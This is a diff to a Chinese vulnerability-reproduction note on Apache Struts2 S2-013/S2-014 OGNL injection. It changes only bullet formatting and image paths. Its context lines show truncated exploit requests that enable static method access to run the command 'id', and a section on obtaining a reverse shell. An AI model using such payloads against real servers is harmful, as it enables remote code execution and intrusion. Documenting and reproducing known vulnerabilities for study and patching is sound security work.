@@ -12,8 +12,8 @@ Struts2 标签中 `<s:a>` 和 `<s:url>` 都包含一个 includeParams 属性，�
 
 漏洞详情:
 
-- http://struts.apache.org/docs/s2-013.html
-- http://struts.apache.org/docs/s2-014.html
+* http://struts.apache.org/docs/s2-013.html
+* http://struts.apache.org/docs/s2-014.html
 
 ## 漏洞影响
 
@@ -50,7 +50,7 @@ http://your-vps-ip:8080/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMet
 
 成功执行命令 `id`：
 
-![image-20220301174558051](images/202203011745146.png)
+![image-20220301174558051](../.gitbook/assets/202203011745146.png)
 
 ### 反弹 shell
 
@@ -87,4 +87,4 @@ GET /link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dt
 
 成功接收反弹 shell：
 
-![image-20220301174700233](images/202203011747317.png)
+![image-20220301174700233](../.gitbook/assets/202203011747317.png)
